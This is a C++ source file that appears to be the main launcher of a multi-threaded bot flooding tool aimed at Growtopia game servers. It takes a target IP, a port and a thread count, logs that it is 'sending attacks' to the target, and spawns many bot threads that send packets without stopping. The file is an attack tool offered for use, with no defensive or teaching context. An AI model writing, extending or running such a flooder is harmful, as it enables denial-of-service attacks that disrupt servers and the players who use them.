#include "../include/corefunc.h"
#include "../include/log.h"
#include "../include/userfunc.h"
#include <thread>

using namespace std;

vector<thread> threads;

void botxd() {
  GrowtopiaBot bot;
  bot.userInit();
  bot.eventLoop();
  bot.userLoop();
}

int main(int argc, char *argv[]) {
  // capture args
  if (argc < 5) {
    cout << "Usage: " << argv[0]
         << " <ip> <port> <threads> <use new packet y/n>" << endl;
    return 1;
  }
  // get ip and port
  SERVER_HOST = argv[1];
  uint16_t port = atoi(argv[2]);
  size_t thread_size = atoi(argv[3]);
  useNewPacket = (std::string(argv[4]) == "y" || std::string(argv[4]) == "Y");

  // Logs
  logger::Info("Sending attacks to %s:%d", SERVER_HOST.c_str(), port);

  // init enet
  init();

  // simple bot loading and sending packets instantly
  for (size_t i = 0; i < thread_size; ++i)
    threads.push_back(std::thread(botxd));

  for (auto &th : threads) {
    if (th.joinable())
      th.join();
  }
  // These lines never execute due to the infinite loop above.
  // but included for completeness
  enet_deinitialize();
  return 0;
}
